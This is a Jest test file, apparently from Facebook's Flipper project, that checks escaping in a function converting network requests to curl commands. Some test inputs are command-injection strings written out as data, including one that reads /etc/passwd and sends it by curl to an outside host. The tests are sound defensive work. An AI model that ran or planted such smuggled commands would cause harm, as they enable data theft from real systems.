/**
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 *
 * @format
 */

import {convertRequestToCurlCommand} from '../utils';
import {Request} from '../types';

test('convertRequestToCurlCommand: simple GET', () => {
  const request: Request = {
    id: 'request id',
    timestamp: 1234567890,
    method: 'GET',
    url: 'https://fbflipper.com/',
    headers: [],
    data: null,
  };

  const command = convertRequestToCurlCommand(request);
  expect(command).toEqual("curl -v -X GET 'https://fbflipper.com/'");
});

test('convertRequestToCurlCommand: simple POST', () => {
  const request: Request = {
    id: 'request id',
    timestamp: 1234567890,
    method: 'POST',
    url: 'https://fbflipper.com/',
    headers: [],
    data: btoa('some=data&other=param'),
  };

  const command = convertRequestToCurlCommand(request);
  expect(command).toEqual(
    "curl -v -X POST 'https://fbflipper.com/' -d 'some=data&other=param'",
  );
});

test('convertRequestToCurlCommand: malicious POST URL', () => {
  let request: Request = {
    id: 'request id',
    timestamp: 1234567890,
    method: 'POST',
    url: "https://fbflipper.com/'; cat /etc/password",
    headers: [],
    data: btoa('some=data&other=param'),
  };

  let command = convertRequestToCurlCommand(request);
  expect(command).toEqual(
    "curl -v -X POST $'https://fbflipper.com/\\'; cat /etc/password' -d 'some=data&other=param'",
  );

  request = {
    id: 'request id',
    timestamp: 1234567890,
    method: 'POST',
    url: 'https://fbflipper.com/"; cat /etc/password',
    headers: [],
    data: btoa('some=data&other=param'),
  };

  command = convertRequestToCurlCommand(request);
  expect(command).toEqual(
    "curl -v -X POST 'https://fbflipper.com/\"; cat /etc/password' -d 'some=data&other=param'",
  );
});

test('convertRequestToCurlCommand: malicious POST URL', () => {
  let request: Request = {
    id: 'request id',
    timestamp: 1234567890,
    method: 'POST',
    url: "https://fbflipper.com/'; cat /etc/password",
    headers: [],
    data: btoa('some=data&other=param'),
  };

  let command = convertRequestToCurlCommand(request);
  expect(command).toEqual(
    "curl -v -X POST $'https://fbflipper.com/\\'; cat /etc/password' -d 'some=data&other=param'",
  );

  request = {
    id: 'request id',
    timestamp: 1234567890,
    method: 'POST',
    url: 'https://fbflipper.com/"; cat /etc/password',
    headers: [],
    data: btoa('some=data&other=param'),
  };

  command = convertRequestToCurlCommand(request);
  expect(command).toEqual(
    "curl -v -X POST 'https://fbflipper.com/\"; cat /etc/password' -d 'some=data&other=param'",
  );
});

test('convertRequestToCurlCommand: malicious POST data', () => {
  let request: Request = {
    id: 'request id',
    timestamp: 1234567890,
    method: 'POST',
    url: 'https://fbflipper.com/',
    headers: [],
    data: btoa('some=\'; curl https://somewhere.net -d "$(cat /etc/passwd)"'),
  };

  let command = convertRequestToCurlCommand(request);
  expect(command).toEqual(
    "curl -v -X POST 'https://fbflipper.com/' -d $'some=\\'; curl https://somewhere.net -d \"$(cat /etc/passwd)\"'",
  );

  request = {
    id: 'request id',
    timestamp: 1234567890,
    method: 'POST',
    url: 'https://fbflipper.com/',
    headers: [],
    data: btoa('some=!!'),
  };

  command = convertRequestToCurlCommand(request);
  expect(command).toEqual(
    "curl -v -X POST 'https://fbflipper.com/' -d $'some=\\u21\\u21'",
  );
});

test('convertRequestToCurlCommand: control characters', () => {
  const request: Request = {
    id: 'request id',
    timestamp: 1234567890,
    method: 'GET',
    url: 'https://fbflipper.com/',
    headers: [],
    data: btoa('some=\u0007 \u0009 \u000C \u001B&other=param'),
  };

  const command = convertRequestToCurlCommand(request);
  expect(command).toEqual(
    "curl -v -X GET 'https://fbflipper.com/' -d $'some=\\u07 \\u09 \\u0c \\u1b&other=param'",
  );
});
